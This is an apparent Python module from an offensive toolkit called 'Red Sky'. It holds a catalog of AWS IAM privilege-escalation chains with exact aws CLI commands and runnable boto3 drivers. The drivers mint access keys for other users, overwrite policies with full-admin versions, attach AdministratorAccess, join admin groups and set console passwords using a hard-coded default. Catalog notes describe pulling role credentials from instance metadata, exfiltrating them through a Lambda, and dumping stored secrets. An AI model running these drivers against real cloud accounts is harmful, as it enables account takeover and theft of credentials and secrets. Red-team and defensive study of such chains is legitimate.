# language: Python, file: Program/cloud/privesc.py, target: Red Sky cloud — IAM privilege escalation
# AWS privilege-escalation toolkit. Two halves:
#
#   1. Chain catalog. Every published AWS IAM privesc path (Rhino Security
#      Labs' atlas, plus additions). Each entry lists the source permission
#      set, the target of the escalation, and the exact API calls that
#      execute it.
#
#   2. Drivers. Runnable implementations for the most common chains:
#       create_access_key       — mint a new key for another user
#       create_policy_version   — attach a new full-admin version of a
#                                 policy the user already has
#       set_default_policy_version
#       attach_user_policy      — attach AdministratorAccess directly
#       put_user_policy         — drop an inline admin policy
#       add_user_to_group       — join an admin group
#       update_login_profile    — set a password on a user with no login
#
# Called with --dry-run prints exactly what the calls would be, so the
# operator can verify the chain before running.

import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud"
PE_DIR = CLOUD_DIR / "privesc"


CHAINS: Dict[str, Dict] = {
    "create_access_key": {
        "title": "CreateAccessKey on another user",
        "needed": ["iam:CreateAccessKey"],
        "target": "any user with more permissions than you",
        "calls": [
            "aws iam create-access-key --user-name <TARGET>",
        ],
        "notes": "The classic. If you can CreateAccessKey on the admin, you own the account.",
    },
    "create_policy_version": {
        "title": "CreatePolicyVersion on a policy you're attached to",
        "needed": ["iam:CreatePolicyVersion"],
        "target": "the policy itself — escalate its definition to *:*",
        "calls": [
            "aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document <FULL_ADMIN_JSON> --set-as-default",
        ],
        "notes": "If you're attached to any policy, you can overwrite it with a full-admin version and set it default.",
    },
    "set_default_policy_version": {
        "title": "SetDefaultPolicyVersion on a policy with a permissive v2+",
        "needed": ["iam:SetDefaultPolicyVersion"],
        "target": "the policy itself",
        "calls": [
            "aws iam list-policy-versions --policy-arn <POLICY_ARN>",
            "aws iam set-default-policy-version --policy-arn <POLICY_ARN> --version-id <V2_OR_LATER>",
        ],
        "notes": "Some policies have hidden permissive versions from prior experimentation. Find one and switch to it.",
    },
    "attach_user_policy": {
        "title": "AttachUserPolicy — attach AdministratorAccess to yourself",
        "needed": ["iam:AttachUserPolicy"],
        "target": "your own user",
        "calls": [
            "aws iam attach-user-policy --user-name <YOU> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        ],
    },
    "put_user_policy": {
        "title": "PutUserPolicy — drop an inline full-admin policy on yourself",
        "needed": ["iam:PutUserPolicy"],
        "target": "your own user",
        "calls": [
            "aws iam put-user-policy --user-name <YOU> --policy-name pwn --policy-document <FULL_ADMIN_JSON>",
        ],
    },
    "add_user_to_group": {
        "title": "AddUserToGroup — join a group with more permissions",
        "needed": ["iam:AddUserToGroup"],
        "target": "an admin group",
        "calls": [
            "aws iam list-groups",
            "aws iam list-attached-group-policies --group-name <ADMIN_GROUP>",
            "aws iam add-user-to-group --user-name <YOU> --group-name <ADMIN_GROUP>",
        ],
    },
    "update_login_profile": {
        "title": "UpdateLoginProfile / CreateLoginProfile — password on a user",
        "needed": ["iam:CreateLoginProfile OR iam:UpdateLoginProfile"],
        "target": "the admin user or your own user",
        "calls": [
            "aws iam create-login-profile --user-name <TARGET> --password '<PW>' --no-password-reset-required",
            "aws iam update-login-profile --user-name <TARGET> --password '<PW>' --no-password-reset-required",
        ],
        "notes": "Gets you console access as the target — useful when API is blocked but console is not.",
    },
    "attach_role_policy": {
        "title": "AttachRolePolicy on a role you can assume",
        "needed": ["iam:AttachRolePolicy"],
        "target": "a role you can sts:AssumeRole into",
        "calls": [
            "aws iam attach-role-policy --role-name <ROLE> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        ],
    },
    "put_role_policy": {
        "title": "PutRolePolicy on a role you can assume",
        "needed": ["iam:PutRolePolicy"],
        "target": "a role you can sts:AssumeRole into",
        "calls": [
            "aws iam put-role-policy --role-name <ROLE> --policy-name pwn --policy-document <FULL_ADMIN_JSON>",
        ],
    },
    "create_policy_version_role": {
        "title": "CreatePolicyVersion on a role's attached policy",
        "needed": ["iam:CreatePolicyVersion"],
        "target": "a role you can assume",
        "calls": [
            "aws iam create-policy-version --policy-arn <ROLE_POLICY_ARN> --policy-document <FULL_ADMIN_JSON> --set-as-default",
        ],
    },
    "update_assume_role_policy": {
        "title": "UpdateAssumeRolePolicy — let yourself assume an admin role",
        "needed": ["iam:UpdateAssumeRolePolicy"],
        "target": "any role with powerful policies",
        "calls": [
            "aws iam update-assume-role-policy --role-name <ROLE> --policy-document <TRUST_YOU_JSON>",
            "aws sts assume-role --role-arn <ROLE_ARN> --role-session-name pwn",
        ],
        "notes": "Rewrite the role's trust policy to allow your principal, then assume it.",
    },
    "passrole_ec2": {
        "title": "PassRole + RunInstances — attach an admin role to a new EC2",
        "needed": ["iam:PassRole", "ec2:RunInstances"],
        "target": "an admin role",
        "calls": [
            "aws ec2 run-instances --image-id <AMI> --instance-type t3.micro --iam-instance-profile Name=<ADMIN_PROFILE> --user-data file://<SSH_BACK_SCRIPT>",
        ],
        "notes": "The user-data script pulls the role's creds from IMDS on the new box, then calls back.",
    },
    "passrole_lambda": {
        "title": "PassRole + CreateFunction — attach an admin role to a Lambda",
        "needed": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
        "target": "an admin role",
        "calls": [
            "aws lambda create-function --function-name pwn --runtime python3.11 --role <ADMIN_ROLE_ARN> --handler index.handler --zip-file fileb://<LAMBDA_ZIP>",
            "aws lambda invoke --function-name pwn /tmp/out",
        ],
        "notes": "Lambda body reads env, calls sts:GetCallerIdentity, exfiltrates creds. No SSH needed.",
    },
    "passrole_glue": {
        "title": "PassRole + CreateDevEndpoint — Glue dev endpoint with admin role",
        "needed": ["iam:PassRole", "glue:CreateDevEndpoint"],
        "target": "an admin role",
        "calls": [
            "aws glue create-dev-endpoint --endpoint-name pwn --role-arn <ADMIN_ROLE_ARN> --public-key file://<SSH_PUB>",
            "ssh -i <KEY> glue@<ENDPOINT>",
        ],
        "notes": "Historically a one-shot; Glue dev endpoints give you a shell as the attached role.",
    },
    "passrole_cloudformation": {
        "title": "PassRole + CreateStack — CloudFormation with admin role",
        "needed": ["iam:PassRole", "cloudformation:CreateStack"],
        "target": "an admin role",
        "calls": [
            "aws cloudformation create-stack --stack-name pwn --template-body file://<TEMPLATE> --role-arn <ADMIN_ROLE_ARN>",
        ],
        "notes": "Template spins up an EC2 with the role attached. Same shape as the EC2 path, different API surface.",
    },
    "ssm_getparameter": {
        "title": "SSM GetParameter — read the admin's stored secrets",
        "needed": ["ssm:GetParameter", "ssm:GetParameters", "ssm:GetParametersByPath"],
        "target": "secrets stored in Parameter Store",
        "calls": [
            "aws ssm get-parameters-by-path --path / --recursive --with-decryption",
        ],
        "notes": "Direct path to admin creds, API keys, DB passwords. Often overlooked.",
    },
    "secretsmanager": {
        "title": "SecretsManager GetSecretValue — read stored secrets",
        "needed": ["secretsmanager:GetSecretValue", "secretsmanager:ListSecrets"],
        "target": "secrets stored in SecretsManager",
        "calls": [
            "aws secretsmanager list-secrets",
            "aws secretsmanager get-secret-value --secret-id <ARN>",
        ],
    },
    "lambda_update_code": {
        "title": "Lambda UpdateFunctionCode — overwrite an existing function",
        "needed": ["lambda:UpdateFunctionCode"],
        "target": "any Lambda whose role has more than you",
        "calls": [
            "aws lambda update-function-code --function-name <FN> --zip-file fileb://<NEW_CODE>",
            "aws lambda invoke --function-name <FN> /tmp/out",
        ],
    },
}


FULL_ADMIN_POLICY = {
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}],
}


def _boto3_session(profile: str, region: str):
    try:
        import boto3  # type: ignore
    except ImportError:
        print_err("this driver requires boto3 — pip install boto3")
        return None
    if profile:
        return boto3.Session(profile_name=profile, region_name=region)
    return boto3.Session(region_name=region)


# ── drivers ─────────────────────────────────────────────────────────────────

def drv_create_access_key(sess, target_user: str, dry_run: bool) -> int:
    if dry_run:
        print_info("[dry] iam:CreateAccessKey UserName=" + target_user)
        return 0
    try:
        iam = sess.client("iam")
        r = iam.create_access_key(UserName=target_user)
        key = r["AccessKey"]
        print_ok("new key minted")
        print_kv("user", target_user)
        print_kv("access_key_id", key["AccessKeyId"])
        print_kv("secret_access_key", key["SecretAccessKey"])
        return 0
    except Exception as e:
        print_err(str(e))
        return 1


def drv_create_policy_version(sess, policy_arn: str, dry_run: bool) -> int:
    if dry_run:
        print_info("[dry] iam:CreatePolicyVersion PolicyArn=" + policy_arn + " SetAsDefault=True")
        print_info("      policy doc: " + json.dumps(FULL_ADMIN_POLICY))
        return 0
    try:
        iam = sess.client("iam")
        r = iam.create_policy_version(
            PolicyArn=policy_arn,
            PolicyDocument=json.dumps(FULL_ADMIN_POLICY),
            SetAsDefault=True,
        )
        print_ok("policy version created and set default")
        print_kv("version_id", r["PolicyVersion"]["VersionId"])
        return 0
    except Exception as e:
        print_err(str(e))
        return 1


def drv_update_login_profile(sess, target_user: str, password: str, dry_run: bool) -> int:
    if dry_run:
        print_info("[dry] iam:CreateLoginProfile / UpdateLoginProfile UserName=" + target_user)
        return 0
    iam = sess.client("iam")
    # try create first; fall back to update
    try:
        iam.create_login_profile(UserName=target_user, Password=password, PasswordResetRequired=False)
        print_ok("login profile created")
        return 0
    except Exception:
        pass
    try:
        iam.update_login_profile(UserName=target_user, Password=password, PasswordResetRequired=False)
        print_ok("login profile updated")
        return 0
    except Exception as e:
        print_err(str(e))
        return 1


def drv_attach_user_policy(sess, target_user: str, policy_arn: str, dry_run: bool) -> int:
    if dry_run:
        print_info("[dry] iam:AttachUserPolicy UserName=" + target_user + " PolicyArn=" + policy_arn)
        return 0
    try:
        sess.client("iam").attach_user_policy(UserName=target_user, PolicyArn=policy_arn)
        print_ok("policy attached")
        return 0
    except Exception as e:
        print_err(str(e))
        return 1


def drv_put_user_policy(sess, target_user: str, dry_run: bool) -> int:
    if dry_run:
        print_info("[dry] iam:PutUserPolicy UserName=" + target_user + " PolicyName=rs_pwn")
        return 0
    try:
        sess.client("iam").put_user_policy(
            UserName=target_user, PolicyName="rs_pwn",
            PolicyDocument=json.dumps(FULL_ADMIN_POLICY),
        )
        print_ok("inline admin policy installed")
        return 0
    except Exception as e:
        print_err(str(e))
        return 1


def drv_add_user_to_group(sess, target_user: str, group: str, dry_run: bool) -> int:
    if dry_run:
        print_info("[dry] iam:AddUserToGroup UserName=" + target_user + " GroupName=" + group)
        return 0
    try:
        sess.client("iam").add_user_to_group(UserName=target_user, GroupName=group)
        print_ok("user added to group")
        return 0
    except Exception as e:
        print_err(str(e))
        return 1


DRIVERS = {
    "create_access_key":     ("target_user", drv_create_access_key),
    "create_policy_version": ("policy_arn",  drv_create_policy_version),
    "update_login_profile":  ("target_user", drv_update_login_profile),
    "attach_user_policy":    ("target_user", drv_attach_user_policy),
    "put_user_policy":       ("target_user", drv_put_user_policy),
    "add_user_to_group":     ("target_user", drv_add_user_to_group),
}


# ── commands ────────────────────────────────────────────────────────────────

def cmd_chain_list() -> int:
    print_info("aws iam privesc chains (" + str(len(CHAINS)) + ")")
    print()
    for key, c in CHAINS.items():
        print("  " + SCARLET + key.ljust(26) + RESET + " " + BONE + c["title"] + RESET)
        print("      " + ASH + "needs: " + ", ".join(c["needed"]) + RESET)
    print()
    print_info("run:  redsky cloud privesc chain <name>")
    return 0


def cmd_chain_show(name: str) -> int:
    if name not in CHAINS:
        print_err("unknown chain: " + name)
        return 1
    c = CHAINS[name]
    print(SCARLET + BOLD + "== " + c["title"] + " ==" + RESET)
    print()
    print(ARTERY + "needs: " + RESET + "  " + ", ".join(c["needed"]))
    print(ARTERY + "target: " + RESET + " " + c["target"])
    print()
    print(ARTERY + "calls:" + RESET)
    for call in c["calls"]:
        print("  " + BONE + call + RESET)
    if c.get("notes"):
        print()
        print(ARTERY + "notes: " + RESET + " " + c["notes"])
    print()
    return 0


def cmd_run(driver: str, target: str, profile: str, region: str, dry_run: bool) -> int:
    if driver not in DRIVERS:
        print_err("no driver for: " + driver)
        print_info("available drivers: " + ", ".join(DRIVERS.keys()))
        return 1
    if not target:
        print_err("--target required (user name, policy ARN, or group name)")
        return 1

    sess = _boto3_session(profile, region)
    if sess is None:
        return 1

    argname, fn = DRIVERS[driver]
    if driver == "create_policy_version":
        return fn(sess, target, dry_run)
    if driver == "update_login_profile":
        # default password
        return fn(sess, target, "RedSky!Pwn2024", dry_run)
    if driver == "attach_user_policy":
        return fn(sess, target, "arn:aws:iam::aws:policy/AdministratorAccess", dry_run)
    return fn(sess, target, dry_run)


def run_cli(args):
    import argparse
    sub = args[0] if args else "chains"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky cloud privesc <sub-command>")
        print_info("")
        print_info("  chains                          list every chain, brief")
        print_info("  chain <name>                    show one chain's API calls")
        print_info("  run <driver> --target X [--profile P] [--region R] [--dry-run]")
        print_info("      execute one driver")
        print_info("")
        print_info("drivers: " + ", ".join(DRIVERS.keys()))
        return 0

    if sub in ("chains", "list"):
        return cmd_chain_list()

    if sub == "chain":
        if not rest:
            print_err("usage: redsky cloud privesc chain <name>")
            return 2
        return cmd_chain_show(rest[0])

    if sub == "run":
        p = argparse.ArgumentParser(prog="redsky cloud privesc run", add_help=False)
        p.add_argument("driver")
        p.add_argument("--target", default="")
        p.add_argument("--profile", default="")
        p.add_argument("--region", default="us-east-1")
        p.add_argument("--dry-run", action="store_true")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky cloud privesc run <driver> --target X [--dry-run]")
            return 2
        return cmd_run(ns.driver, ns.target, ns.profile, ns.region, ns.dry_run)

    print_err("unknown privesc sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
